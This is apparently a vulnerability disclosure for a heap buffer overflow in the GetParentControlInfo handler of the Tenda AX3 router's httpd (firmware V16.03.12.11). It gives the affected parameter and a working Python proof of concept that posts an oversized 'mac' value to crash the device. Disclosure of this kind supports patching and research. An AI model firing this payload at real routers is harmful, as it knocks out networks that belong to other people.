Information
===========

**Vendor of the products**: Tenda <br>

**Vendor's website**: https://www.tenda.com.cn <br>

**Reported by**: korey0sh1(korey0sh2@gmail.com) <br>

**Affected products**: Tenda AX3 <br>

**Affected firmware version**: V16.03.12.11 <br>

**Firmware download address**: https://www.tenda.com.cn/download/detail-3476.html <br>

Overview
===========

**Tenda AX3 V16.03.12.11** has a **heap buffer overflow** vulnerability detected at function **GetParentControlInfo**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the **mac** parameter paramter. <br>

Vulnerability details
=====================
The vulnerability is detected at **/bin/httpd** <br>

In the function **GetParentControlInfo**, the content obtained by program through parameter **mac** given by http is passed to variable **src**. However ,they will be copyed to the **v5** which is a heap ptr without any length check. <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/18.png) <br>

<br>

Proof of Code
====================
```python
from pwn import *
import requests

url = "http://192.168.0.1/goform/GetParentControlInfo"

payload = "a"*0x1000
data = {
    "mac": payload,
}
res = requests.post(url=url,data=data)
print(res.text)
```

Attack Demo
========
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/19.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/20.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/21.png)
